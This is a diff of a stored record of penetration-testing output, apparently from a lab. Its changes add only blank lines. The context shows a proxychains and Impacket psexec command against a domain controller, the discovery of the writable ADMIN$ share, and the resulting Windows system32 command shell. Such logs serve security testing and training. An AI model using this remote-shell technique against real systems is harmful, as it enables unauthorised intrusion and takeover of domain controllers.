@@ -9,6 +9,7 @@ output: 'root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.ban
 
   Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation
 
+
   [*] Requesting shares on dc01.bank.local.....
 
   [*] Found writable share ADMIN$
@@ -26,6 +27,7 @@ output: 'root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.ban
   Microsoft Windows [Version 10.0.14393]
 
   (c) 2016 Microsoft Corporation. All rights reserved.
+
 
   C:\Windows\system32>'
 created_at: '2020-06-24T05:08:26.192791+00:00'
@@ -56,3 +58,5 @@ Microsoft Windows [Version 10.0.14393]
 
 C:\Windows\system32>
 ```
+
+
